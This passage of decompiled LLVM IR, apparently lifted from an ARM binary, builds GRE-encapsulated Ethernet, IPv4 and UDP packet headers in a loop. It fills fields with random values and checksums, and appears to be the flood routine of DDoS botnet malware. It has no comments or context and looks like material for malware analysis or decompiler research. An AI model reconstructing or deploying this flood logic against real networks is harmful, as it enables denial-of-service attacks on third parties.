  %v3_9960 = mul nuw nsw i32 %v1_9904, 256
  store i32 %v3_9960, i32* %r5.global-to-local, align 4
  %tmp90 = udiv i32 %v0_9890, 256
  %v4_9964 = urem i32 %tmp90, 256
  %v5_9964 = or i32 %v4_9964, %v3_9954
  store i32 %v5_9964, i32* %r7.global-to-local, align 4
  %v3_9968 = udiv i32 %v1_98f8, 256
  %tmp91 = udiv i32 %v0_9894, 256
  %v4_996c = urem i32 %tmp91, 256
  %v5_996c = or i32 %v4_996c, %v3_9960
  store i32 %v5_996c, i32* %sl.global-to-local, align 4
  %v3_9978 = sdiv i32 %v3_989c, 16777216
  %v7_9978 = sdiv i32 %v1_9900, 16777216
  %v1_997c = and i32 %v3_9968, 65280
  store i32 %v1_997c, i32* %r6.global-to-local, align 4
  %v3_9980 = ashr i32 %v3_989c, 31
  %v3_9984 = ashr i32 %v1_9900, 31
  %v3_9988 = udiv i32 %v1_98e0, 65536
  %v4_998c = udiv i32 %v1_98f8, 16777216
  %v5_998c = or i32 %v4_998c, %v1_997c
  store i32 %v5_998c, i32* %r8.global-to-local, align 4
  store i32 %v1_98ec, i32* %r1.global-to-local, align 4
  store i32 %v1_9904, i32* %r2.global-to-local, align 4
  %v3_99a438 = udiv i32 %v1_997c, 256
  store i32 %v3_99a438, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_9b04 = icmp eq i32 %v1_98a0, 0
  %sext18 = mul i32 %v0_9890, 16777216
  %v4_9b18 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v1_98f8, 256
  %v4_9b2c = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_9894, 16777216
  %v4_9b34 = sdiv i32 %sext20, 16777216
  %v1_9a18 = trunc i32 %v3_995c to i8
  %v1_9b3c = trunc i32 %v4_9b2c to i8
  br label %dec_label_pc_99b8

dec_label_pc_99b8:                                ; preds = %bb98, %dec_label_pc_98d4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_99c4 = call i32* @calloc(i32 1510, i32 4)
  %v4_99c4 = ptrtoint i32* %v2_99c4 to i32
  store i32 %v4_99c4, i32* %r0.global-to-local, align 4
  store i32 %v4_9724, i32* %r1.global-to-local, align 4
  %v3_99cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_99cc, i32* %r3.global-to-local, align 4
  %v2_99d0 = load i32, i32* %r4.global-to-local, align 4
  %v5_99d0 = mul i32 %v2_99d0, 4
  %v6_99d0 = add i32 %v5_99d0, %v4_9724
  %v7_99d0 = inttoptr i32 %v6_99d0 to i32*
  store i32 %v4_99c4, i32* %v7_99d0, align 4
  %v0_99d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_99d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_99d4 = mul i32 %v1_99d4, 4
  %v5_99d4 = add i32 %v4_99d4, %v0_99d4
  %v6_99d4 = inttoptr i32 %v5_99d4 to i32*
  %v7_99d4 = load i32, i32* %v6_99d4, align 4
  store i32 %v7_99d4, i32* %r4.global-to-local, align 4
  %v1_99d8 = inttoptr i32 %v7_99d4 to i8*
  %v2_99d8 = load i8, i8* %v1_99d8, align 1
  %tmp = urem i8 %v2_99d8, 16
  %v1_99dc = zext i8 %tmp to i32
  %v1_99e0 = or i32 %v1_99dc, 64
  store i32 %v1_99e0, i32* %r2.global-to-local, align 4
  %v1_99e4 = trunc i32 %v1_99e0 to i8
  store i8 %v1_99e4, i8* %v1_99d8, align 1
  %v0_99e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_99e8 = inttoptr i32 %v0_99e8 to i8*
  %v2_99e8 = load i8, i8* %v1_99e8, align 1
  %v1_99ec = and i8 %v2_99e8, -16
  %v1_99f0 = or i8 %v1_99ec, 5
  store i32 %v1_97a4, i32* %r2.global-to-local, align 4
  store i8 %v1_99f0, i8* %v1_99e8, align 1
  %v2_9a00 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a00 = add i32 %v2_9a00, 1
  %v4_9a00 = inttoptr i32 %v3_9a00 to i8*
  store i8 %v5_975c, i8* %v4_9a00, align 1
  store i32 %v6_9778, i32* %r1.global-to-local, align 4
  %v2_9a08 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a08 = add i32 %v2_9a08, 8
  %v4_9a08 = inttoptr i32 %v3_9a08 to i8*
  store i8 %v5_9794, i8* %v4_9a08, align 1
  store i32 %v3_995c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_9a14 = load i32, i32* %r2.global-to-local, align 4
  %v9_9a14 = icmp eq i32 %v0_9a14, 0
  store i1 %v9_9a14, i1* %cpsr_z.global-to-local, align 1
  %v2_9a18 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a18 = add i32 %v2_9a18, 3
  %v4_9a18 = inttoptr i32 %v3_9a18 to i8*
  store i8 %v1_9a18, i8* %v4_9a18, align 1
  store i32 %v4_9918, i32* %r2.global-to-local, align 4
  %v0_9a20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9a20, label %.thread22, label %.thread

.thread:                                          ; preds = %dec_label_pc_99b8
  %v1_9a20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_9a20, i32* %r3.global-to-local, align 4
  %v2_9a24 = trunc i32 %v1_9a20 to i8
  %v3_9a24 = load i32, i32* %r4.global-to-local, align 4
  %v4_9a24 = add i32 %v3_9a24, 7
  %v5_9a24 = inttoptr i32 %v4_9a24 to i8*
  store i8 %v2_9a24, i8* %v5_9a24, align 1
  %v0_9a28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9a28.pr.pr, label %.thread22, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9a2c = load i32, i32* %r4.global-to-local, align 4
  %v4_9a2c = add i32 %v3_9a2c, 6
  %v5_9a2c = inttoptr i32 %v4_9a2c to i8*
  store i8 64, i8* %v5_9a2c, align 1
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_99b8, %.thread, %bb
  %v0_9a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a30 = trunc i32 %v0_9a30 to i8
  %v2_9a30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a30 = add i32 %v2_9a30, 2
  %v4_9a30 = inttoptr i32 %v3_9a30 to i8*
  store i8 %v1_9a30, i8* %v4_9a30, align 1
  store i32 %v3_9980, i32* %r2.global-to-local, align 4
  store i32 %v3_9978, i32* %r1.global-to-local, align 4
  %v2_9a40 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a40 = add i32 %v2_9a40, 9
  %v4_9a40 = inttoptr i32 %v3_9a40 to i8*
  store i8 47, i8* %v4_9a40, align 1
  %v0_9a44 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a44 = trunc i32 %v0_9a44 to i8
  %v2_9a44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a44 = add i32 %v2_9a44, 5
  %v4_9a44 = inttoptr i32 %v3_9a44 to i8*
  store i8 %v1_9a44, i8* %v4_9a44, align 1
  %v3_9a48 = load i32, i32* %stack_var_-40, align 4
  %v5_9a50 = mul i32 %v3_9a48, 24
  store i32 %v5_9a50, i32* %r3.global-to-local, align 4
  store i32 %v6_9844, i32* %r2.global-to-local, align 4
  %v1_9a58 = load i32, i32* %r4.global-to-local, align 4
  %v2_9a58 = add i32 %v1_9a58, 12
  %v3_9a58 = inttoptr i32 %v2_9a58 to i32*
  store i32 %v6_9844, i32* %v3_9a58, align 4
  %v0_9a5c = load i32, i32* %r3.global-to-local, align 4
  %v1_9a5c = load i32, i32* @sb, align 4
  %v2_9a5c = add i32 %v1_9a5c, %v0_9a5c
  store i32 %v2_9a5c, i32* %r3.global-to-local, align 4
  %v1_9a60 = add i32 %v2_9a5c, 16
  %v2_9a60 = inttoptr i32 %v1_9a60 to i32*
  %v3_9a60 = load i32, i32* %v2_9a60, align 4
  store i32 %v3_9a60, i32* %r2.global-to-local, align 4
  %v0_9a64 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a64 = trunc i32 %v0_9a64 to i8
  %v2_9a64 = load i32, i32* %r4.global-to-local, align 4
  %v3_9a64 = add i32 %v2_9a64, 4
  %v4_9a64 = inttoptr i32 %v3_9a64 to i8*
  store i8 %v1_9a64, i8* %v4_9a64, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_9a6c = load i32, i32* %r4.global-to-local, align 4
  %v1_9a6c = add i32 %v0_9a6c, 20
  store i32 %v1_9a6c, i32* %r1.global-to-local, align 4
  %v3_9a70 = add i32 %v0_9a6c, 22
  %v4_9a70 = inttoptr i32 %v3_9a70 to i8*
  store i8 101, i8* %v4_9a70, align 1
  %v0_9a74 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a74 = load i32, i32* %r4.global-to-local, align 4
  %v2_9a74 = add i32 %v1_9a74, 16
  %v3_9a74 = inttoptr i32 %v2_9a74 to i32*
  store i32 %v0_9a74, i32* %v3_9a74, align 4
  %v0_9a78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9a78 = add i32 %v0_9a78, 24
  store i32 %v1_9a78, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_9a80 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a80 = add i32 %v0_9a80, -93
  store i32 %v1_9a80, i32* %r3.global-to-local, align 4
  %v2_9a84 = load i32, i32* %r1.global-to-local, align 4
  %v3_9a84 = add i32 %v2_9a84, 3
  %v4_9a84 = inttoptr i32 %v3_9a84 to i8*
  store i8 88, i8* %v4_9a84, align 1
  %v0_9a88 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a88 = trunc i32 %v0_9a88 to i8
  %v2_9a88 = load i32, i32* %r0.global-to-local, align 4
  %v3_9a88 = add i32 %v2_9a88, 12
  %v4_9a88 = inttoptr i32 %v3_9a88 to i8*
  store i8 %v1_9a88, i8* %v4_9a88, align 1
  %v0_9a8c = load i32, i32* %ip.global-to-local, align 4
  %v1_9a8c = trunc i32 %v0_9a8c to i8
  %v2_9a8c = load i32, i32* %r0.global-to-local, align 4
  %v3_9a8c = add i32 %v2_9a8c, 13
  %v4_9a8c = inttoptr i32 %v3_9a8c to i8*
  store i8 %v1_9a8c, i8* %v4_9a8c, align 1
  %v0_9a90 = load i32, i32* %r4.global-to-local, align 4
  %v1_9a90 = add i32 %v0_9a90, 38
  %v2_9a90 = inttoptr i32 %v1_9a90 to i8*
  %v3_9a90 = load i8, i8* %v2_9a90, align 1
  %tmp103 = urem i8 %v3_9a90, 16
  %v1_9a94 = zext i8 %tmp103 to i32
  %v1_9a98 = or i32 %v1_9a94, 64
  store i32 %v1_9a98, i32* %r3.global-to-local, align 4
  %v1_9a9c = trunc i32 %v1_9a98 to i8
  store i8 %v1_9a9c, i8* %v2_9a90, align 1
  %v0_9aa0 = load i32, i32* %r4.global-to-local, align 4
  %v1_9aa0 = add i32 %v0_9aa0, 38
  %v2_9aa0 = inttoptr i32 %v1_9aa0 to i8*
  %v3_9aa0 = load i8, i8* %v2_9aa0, align 1
  %v1_9aa4 = and i8 %v3_9aa0, -16
  %v1_9aa8 = or i8 %v1_9aa4, 5
  store i8 %v1_9aa8, i8* %v2_9aa0, align 1
  %v0_9ab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_9ab4 = add i32 %v0_9ab4, 38
  store i32 %v1_9ab4, i32* %r5.global-to-local, align 4
  %v3_9ab8 = add i32 %v0_9ab4, 39
  %v4_9ab8 = inttoptr i32 %v3_9ab8 to i8*
  store i8 %v5_975c, i8* %v4_9ab8, align 1
  store i32 %v7_9978, i32* %r1.global-to-local, align 4
  store i32 %tmp89, i32* %r3.global-to-local, align 4
  store i32 %v3_9984, i32* %r2.global-to-local, align 4
  %v2_9ac8 = load i32, i32* %r5.global-to-local, align 4
  %v3_9ac8 = add i32 %v2_9ac8, 4
  %v4_9ac8 = inttoptr i32 %v3_9ac8 to i8*
  store i8 %v5_9948, i8* %v4_9ac8, align 1
  %v0_9acc = load i32, i32* %r1.global-to-local, align 4
  %v1_9acc = trunc i32 %v0_9acc to i8
  %v2_9acc = load i32, i32* %r5.global-to-local, align 4
  %v3_9acc = add i32 %v2_9acc, 2
  %v4_9acc = inttoptr i32 %v3_9acc to i8*
  store i8 %v1_9acc, i8* %v4_9acc, align 1
  %v0_9ad0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9ad0, label %bb93, label %bb92

bb92:                                             ; preds = %.thread22
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %.thread22, %bb92
  store i32 %v3_9988, i32* %r1.global-to-local, align 4
  %v0_9ad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_9ad8 = trunc i32 %v0_9ad8 to i8
  %v2_9ad8 = load i32, i32* %r5.global-to-local, align 4
  %v3_9ad8 = add i32 %v2_9ad8, 3
  %v4_9ad8 = inttoptr i32 %v3_9ad8 to i8*
  store i8 %v1_9ad8, i8* %v4_9ad8, align 1
  store i32 %v6_9778, i32* %r2.global-to-local, align 4
  %v0_9ae0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9ae0, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_9ae0 = load i32, i32* %r3.global-to-local, align 4
  %v2_9ae0 = trunc i32 %v1_9ae0 to i8
  %v3_9ae0 = load i32, i32* %r5.global-to-local, align 4
  %v4_9ae0 = add i32 %v3_9ae0, 6
  %v5_9ae0 = inttoptr i32 %v4_9ae0 to i8*
  store i8 %v2_9ae0, i8* %v5_9ae0, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9ae8 = trunc i32 %v0_9ae8 to i8
  %v2_9ae8 = load i32, i32* %r5.global-to-local, align 4
  %v3_9ae8 = add i32 %v2_9ae8, 5
  %v4_9ae8 = inttoptr i32 %v3_9ae8 to i8*
  store i8 %v1_9ae8, i8* %v4_9ae8, align 1
  %v0_9aec = load i32, i32* %r2.global-to-local, align 4
  %v1_9aec = trunc i32 %v0_9aec to i8
  %v2_9aec = load i32, i32* %r5.global-to-local, align 4
  %v3_9aec = add i32 %v2_9aec, 8
  %v4_9aec = inttoptr i32 %v3_9aec to i8*
  store i8 %v1_9aec, i8* %v4_9aec, align 1
  %v0_9af0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9af0, label %bb97, label %bb96

bb96:                                             ; preds = %bb95
  %v1_9af0 = load i32, i32* %ip.global-to-local, align 4
  %v2_9af0 = trunc i32 %v1_9af0 to i8
  %v3_9af0 = load i32, i32* %r5.global-to-local, align 4
  %v4_9af0 = add i32 %v3_9af0, 7
  %v5_9af0 = inttoptr i32 %v4_9af0 to i8*
  store i8 %v2_9af0, i8* %v5_9af0, align 1
  br label %bb97

bb97:                                             ; preds = %bb95, %bb96
  %v0_9af4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9af4 = trunc i32 %v0_9af4 to i8
  %v2_9af4 = load i32, i32* %r5.global-to-local, align 4
  %v3_9af4 = add i32 %v2_9af4, 9
  %v4_9af4 = inttoptr i32 %v3_9af4 to i8*
  store i8 %v1_9af4, i8* %v4_9af4, align 1
  %v0_9af8 = call i32 @function_f6c4()
  store i32 %v0_9af8, i32* %r0.global-to-local, align 4
  store i32 %v1_98a0, i32* %r1.global-to-local, align 4
  store i1 %v2_9b04, i1* %cpsr_z.global-to-local, align 1
  %v1_9b08 = sub i32 1023, %v0_9af8
  store i32 %v1_9b08, i32* %r3.global-to-local, align 4
  br i1 %v2_9b04, label %.thread23, label %.thread24

.thread23:                                        ; preds = %bb97
  %v2_9b10 = load i32, i32* %r5.global-to-local, align 4
  %v3_9b10 = add i32 %v2_9b10, 16
  %v4_9b10 = inttoptr i32 %v3_9b10 to i32*
  store i32 %v1_9b08, i32* %v4_9b10, align 4
  br label %bb98

.thread24:                                        ; preds = %bb97
  %v1_9b0c = load i32, i32* %r4.global-to-local, align 4
  %v2_9b0c = add i32 %v1_9b0c, 16
  %v3_9b0c = inttoptr i32 %v2_9b0c to i32*
  %v4_9b0c = load i32, i32* %v3_9b0c, align 4
  store i32 %v4_9b0c, i32* %r3.global-to-local, align 4
  %v2_9b14 = load i32, i32* %r5.global-to-local, align 4
  %v3_9b14 = add i32 %v2_9b14, 16
  %v4_9b14 = inttoptr i32 %v3_9b14 to i32*
  store i32 %v4_9b0c, i32* %v4_9b14, align 4
  br label %bb98

bb98:                                             ; preds = %.thread23, %.thread24
  store i32 %v4_9b18, i32* %r3.global-to-local, align 4
  %v0_9b1c = load i32, i32* %r4.global-to-local, align 4
  %v1_9b1c = add i32 %v0_9b1c, 58
  store i32 %v1_9b1c, i32* %r6.global-to-local, align 4
  %v1_9b20 = load i32, i32* %r5.global-to-local, align 4
  %v2_9b20 = add i32 %v1_9b20, 12
  %v3_9b20 = inttoptr i32 %v2_9b20 to i32*
  store i32 %v0_9af8, i32* %v3_9b20, align 4
  %v0_9b24 = load i32, i32* %r3.global-to-local, align 4
  %v1_9b24 = trunc i32 %v0_9b24 to i8
  %v2_9b24 = load i32, i32* %r6.global-to-local, align 4
  %v3_9b24 = add i32 %v2_9b24, 1
  %v4_9b24 = inttoptr i32 %v3_9b24 to i8*
  store i8 %v1_9b24, i8* %v4_9b24, align 1
  %v3_9b28 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9b28, i32* %r3.global-to-local, align 4
  store i32 %v4_9b2c, i32* %r2.global-to-local, align 4
  %v1_9b30 = add i32 %v3_9b28, 1
  store i32 %v1_9b30, i32* %r4.global-to-local, align 4
  store i32 %v4_9b34, i32* %r1.global-to-local, align 4
  %v1_9b38 = load i32, i32* @fp, align 4
  %v9_9b38 = icmp eq i32 %v1_9b30, %v1_9b38
  store i1 %v9_9b38, i1* %cpsr_z.global-to-local, align 1
  %v2_9b3c = load i32, i32* %r6.global-to-local, align 4
  %v3_9b3c = add i32 %v2_9b3c, 5
  %v4_9b3c = inttoptr i32 %v3_9b3c to i8*
  store i8 %v1_9b3c, i8* %v4_9b3c, align 1
  %v0_9b40 = load i32, i32* %r7.global-to-local, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* %r6.global-to-local, align 4
  %v3_9b40 = inttoptr i32 %v2_9b40 to i8*
  store i8 %v1_9b40, i8* %v3_9b40, align 1
  %v0_9b44 = load i32, i32* %sl.global-to-local, align 4
  %v1_9b44 = trunc i32 %v0_9b44 to i8
  %v2_9b44 = load i32, i32* %r6.global-to-local, align 4
  %v3_9b44 = add i32 %v2_9b44, 2
  %v4_9b44 = inttoptr i32 %v3_9b44 to i8*
  store i8 %v1_9b44, i8* %v4_9b44, align 1
  %v0_9b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_9b48 = trunc i32 %v0_9b48 to i8
  %v2_9b48 = load i32, i32* %r6.global-to-local, align 4
  %v3_9b48 = add i32 %v2_9b48, 3
  %v4_9b48 = inttoptr i32 %v3_9b48 to i8*
  store i8 %v1_9b48, i8* %v4_9b48, align 1
  %v0_9b4c = load i32, i32* %r8.global-to-local, align 4
  %v1_9b4c = trunc i32 %v0_9b4c to i8
  %v2_9b4c = load i32, i32* %r6.global-to-local, align 4
  %v3_9b4c = add i32 %v2_9b4c, 4
  %v4_9b4c = inttoptr i32 %v3_9b4c to i8*
  store i8 %v1_9b4c, i8* %v4_9b4c, align 1
  %v0_9b50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9b50, i32* %stack_var_-40, align 4
  %v5_9b54 = icmp slt i32 %v1_9b30, %v1_9b38
  br i1 %v5_9b54, label %dec_label_pc_99b8, label %dec_label_pc_9b58

dec_label_pc_9b58:                                ; preds = %bb98
  %v1_9b60 = add i32 %v6_97f0, 8
  store i32 %v1_9b60, i32* %r2.global-to-local, align 4
  %v1_9b64 = add i32 %v6_97f0, 66
  store i32 %v1_9b64, i32* %r3.global-to-local, align 4
  %v0_9b70.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_9b70.preheader

dec_label_pc_9b70.preheader:                      ; preds = %dec_label_pc_9b58, %dec_label_pc_9e60
  %v0_9b70.pre = phi i32 [ %v0_9b70.pre.pre, %dec_label_pc_9b58 ], [ %v0_98b4, %dec_label_pc_9e60 ]
  %stack_var_-160.0.ph = phi i32 [ %v1_9b64, %dec_label_pc_9b58 ], [ %v1_9e6c, %dec_label_pc_9e60 ]
  %stack_var_-156.0.ph = phi i32 [ %v1_9b60, %dec_label_pc_9b58 ], [ %v1_9e68, %dec_label_pc_9e60 ]
  %v3_9dc0 = icmp eq i32 %v3_98a8, 65535
  %v2_9e30 = icmp eq i32 %v1_98a0, 0
  %v2_9c14 = ptrtoint i32* %stack_var_-44 to i32
  %v2_9c2c = ptrtoint i32* %stack_var_-48 to i32
  %v2_9c3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_9c48 = ptrtoint i32* %stack_var_-50 to i32
  %v2_9c5c = icmp eq i32 %v1_9810, 0
  %v2_9bb8 = icmp eq i32 %v6_9844, -1
  br label %dec_label_pc_9b70

dec_label_pc_9b70:                                ; preds = %dec_label_pc_9c64, %dec_label_pc_9b70.preheader
  %v0_9b70 = phi i32 [ %v0_9b70.pre, %dec_label_pc_9b70.preheader ], [ %v1_9d28, %dec_label_pc_9c64 ]
  %v2_9b70 = icmp eq i32 %v0_9b70, 0
  store i1 %v2_9b70, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp99 = icmp slt i32 %v0_9b70, 1
  br label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b78, %dec_label_pc_9b70
  br i1 %tmp99, label %dec_label_pc_9b78, label %dec_label_pc_9b7c

dec_label_pc_9b7c:                                ; preds = %dec_label_pc_9b78
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_9b88

dec_label_pc_9b88:                                ; preds = %dec_label_pc_9c64, %dec_label_pc_9b7c
  %v1_9b9c = phi i32 [ %v1_9d24, %dec_label_pc_9c64 ], [ 0, %dec_label_pc_9b7c ]
  %v5_9b8c = mul i32 %v1_9b9c, 24
  %v1_9b90 = load i32, i32* @sb, align 4
  %v2_9b90 = add i32 %v1_9b90, %v5_9b8c
  store i32 %v2_9b90, i32* %r3.global-to-local, align 4
  store i32 %v4_9724, i32* %r1.global-to-local, align 4
  %v1_9b98 = add i32 %v2_9b90, 20
  %v2_9b98 = inttoptr i32 %v1_9b98 to i8*
  %v3_9b98 = load i8, i8* %v2_9b98, align 1
  %v4_9b98 = zext i8 %v3_9b98 to i32
  store i32 %v4_9b98, i32* %r2.global-to-local, align 4
  %v4_9b9c = mul i32 %v1_9b9c, 4
  %v5_9b9c = add i32 %v4_9b9c, %v4_9724
  %v6_9b9c = inttoptr i32 %v5_9b9c to i32*
  %v7_9b9c = load i32, i32* %v6_9b9c, align 4
  store i32 %v7_9b9c, i32* @r5, align 4
  %v7_9ba0 = icmp eq i8 %v3_9b98, 31
  store i1 %v7_9ba0, i1* %cpsr_z.global-to-local, align 1
  %v1_9ba4 = add i32 %v7_9b9c, 24
  store i32 %v1_9ba4, i32* @r8, align 4
  %v1_9ba8 = add i32 %v7_9b9c, 38
  store i32 %v1_9ba8, i32* @r6, align 4
  %v1_9bac = add i32 %v7_9b9c, 58
  store i32 %v1_9bac, i32* @r7, align 4
  %tmp104 = icmp ult i8 %v3_9b98, 32
  br i1 %tmp104, label %dec_label_pc_9d48, label %dec_label_pc_9bb4

dec_label_pc_9bb4:                                ; preds = %dec_label_pc_9b88
  store i32 %v6_9844, i32* %r2.global-to-local, align 4
  store i1 %v2_9bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9bb8, label %dec_label_pc_9db0, label %dec_label_pc_9bc0

dec_label_pc_9bc0:                                ; preds = %dec_label_pc_9d48, %dec_label_pc_9bb4
  store i32 %v3_98a8, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9dc0, label %dec_label_pc_9dcc, label %dec_label_pc_9bd4

dec_label_pc_9bd4:                                ; preds = %dec_label_pc_9db0.dec_label_pc_9bd4_crit_edge, %dec_label_pc_9bc0
  %v1_9bd8 = phi i32 [ %v1_9bd8.pre, %dec_label_pc_9db0.dec_label_pc_9bd4_crit_edge ], [ 65535, %dec_label_pc_9bc0 ]
  store i32 %v3_98ac, i32* %r1.global-to-local, align 4
  %v9_9bd8 = icmp eq i32 %v3_98ac, %v1_9bd8
  store i1 %v9_9bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9bd8, label %dec_label_pc_9e04, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9dcc.dec_label_pc_9be0_crit_edge, %dec_label_pc_9bd4
  %v1_9be4 = phi i32 [ %v1_9be4.pre, %dec_label_pc_9dcc.dec_label_pc_9be0_crit_edge ], [ %v1_9bd8, %dec_label_pc_9bd4 ]
  store i32 %v3_98b0, i32* %r2.global-to-local, align 4
  %v9_9be4 = icmp eq i32 %v3_98b0, %v1_9be4
  store i1 %v9_9be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9be4, label %dec_label_pc_9e20, label %dec_label_pc_9bec

dec_label_pc_9bec:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_9be0
  store i32 %v1_98a0, i32* %r3.global-to-local, align 4
  store i1 %v2_9e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9e30, label %dec_label_pc_9e44, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9bec
  %v1_9bf4 = load i32, i32* @r5, align 4
  %v2_9bf4 = add i32 %v1_9bf4, 16
  %v3_9bf4 = inttoptr i32 %v2_9bf4 to i32*
  %v4_9bf4 = load i32, i32* %v3_9bf4, align 4
  store i32 %v4_9bf4, i32* %r3.global-to-local, align 4
  %v2_9bf8 = load i32, i32* @r6, align 4
  %v3_9bf8 = add i32 %v2_9bf8, 16
  %v4_9bf8 = inttoptr i32 %v3_9bf8 to i32*
  store i32 %v4_9bf4, i32* %v4_9bf8, align 4
  br label %dec_label_pc_9c00

dec_label_pc_9c00:                                ; preds = %bb102, %.thread25, %dec_label_pc_9e44
  %v0_9c00 = call i32 @function_f6c4()
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  store i32 %v0_9c00, i32* %stack_var_-44, align 4
  %v0_9c08 = call i32 @function_f6c4()
  store i32 %v0_9c08, i32* %r0.global-to-local, align 4
  store i32 %v0_9c08, i32* %stack_var_-48, align 4
  %v0_9c10 = call i32 @function_f6c4()
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  store i32 %v0_9c10, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_9c20 = load i32, i32* @r8, align 4
  store i32 %v0_9c20, i32* %r0.global-to-local, align 4
  %v3_9c24 = call i32 @function_11a58(i32 %v0_9c20, i32 %v2_9c14, i32 4)
  %v0_9c28 = load i32, i32* @r8, align 4
  %v1_9c28 = add i32 %v0_9c28, 6
  store i32 %v1_9c28, i32* %r0.global-to-local, align 4
  store i32 %v2_9c2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9c34 = call i32 @function_11a58(i32 %v1_9c28, i32 %v2_9c2c, i32 4)
  %v0_9c38 = load i32, i32* @r8, align 4
  %v1_9c38 = add i32 %v0_9c38, 4
  store i32 %v1_9c38, i32* %r0.global-to-local, align 4
  store i32 %v2_9c3c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9c44 = call i32 @function_11a58(i32 %v1_9c38, i32 %v2_9c3c, i32 2)
  store i32 %v2_9c48, i32* %r1.global-to-local, align 4
  %v0_9c4c = load i32, i32* @r8, align 4
  %v1_9c4c = add i32 %v0_9c4c, 10
  store i32 %v1_9c4c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9c54 = call i32 @function_11a58(i32 %v1_9c4c, i32 %v2_9c48, i32 2)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  store i32 %v1_9810, i32* %r1.global-to-local, align 4
  store i1 %v2_9c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c5c, label %dec_label_pc_9c64, label %dec_label_pc_9e50

dec_label_pc_9c64:                                ; preds = %dec_label_pc_9c00, %dec_label_pc_9e50
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9c68 = load i32, i32* @sl, align 4
  %v1_9c68 = trunc i32 %v0_9c68 to i8
  %v2_9c68 = load i32, i32* @r5, align 4
  %v3_9c68 = add i32 %v2_9c68, 10
  %v4_9c68 = inttoptr i32 %v3_9c68 to i8*
  store i8 %v1_9c68, i8* %v4_9c68, align 1
  %v0_9c6c = load i32, i32* @sl, align 4
  %v1_9c6c = trunc i32 %v0_9c6c to i8
  %v2_9c6c = load i32, i32* @r5, align 4
  %v3_9c6c = add i32 %v2_9c6c, 11
  %v4_9c6c = inttoptr i32 %v3_9c6c to i8*
  store i8 %v1_9c6c, i8* %v4_9c6c, align 1
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* @r0, align 4
  %v2_9c74 = call i32 @function_de24(i32 %v0_9c70, i32 20)
  %v3_9c74 = trunc i32 %v2_9c74 to i8
